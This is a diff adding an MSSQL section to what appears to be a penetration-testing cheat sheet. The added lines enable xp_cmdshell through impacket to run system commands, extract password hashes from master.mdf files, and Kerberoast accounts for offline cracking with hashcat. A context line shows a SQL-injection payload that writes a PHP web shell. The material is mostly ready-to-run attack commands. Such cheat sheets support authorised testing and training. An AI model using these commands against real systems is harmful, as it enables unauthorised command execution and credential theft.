@@ -373,6 +373,37 @@ select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '<OUT_FILE>'
 
 https://asecuritysite.com/encryption/ferdecode
 
+## MSSQL
+
+### With valid credentials
+
+```
+impacket-mssqlclient USER:PASS@IP
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell whoami
+```
+
+### Master.mdf
+
+```
+C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Template Data\master.mdf
+C:\\PROGRA~1\\MICROS~2\\MSSQL1~1.SQL\\MSSQL\\Binn\\Templates\\master.mdf
+PROGRA~1\MICROS~2\MSSQL1~1.SQL\MSSQL\Binn\Templates\master.mdf
+\progra~1\MICROS~1\MSSQL1~1.SQL\MSSQL\Backup\master.mdf
+
+# POWERSHELL - RETRIEVE HASHES
+Add-Type -Path 'OrcaMDF.RawCore.dll'
+Add-Type -Path 'OrcaMDF.Framework.dll'
+import-module .\Get-MDFHashes.ps1
+Get-MDFHashes -mdf "C:\Users\admin\Desktop\master.mdf"
+# IF THE FILE IS IN USE, ONLY BACKUPS CAN BE USED FOR THIS
+# HASHCAT MODULE
+-m 1731
+# CREATE HASHCAT READABLE HASH
+Invoke-Kerberoast -outputformat hashcat | fl
+hashcat -m 13100
+```
+
 # Initial Access
 
 ## SSH Bruteforce
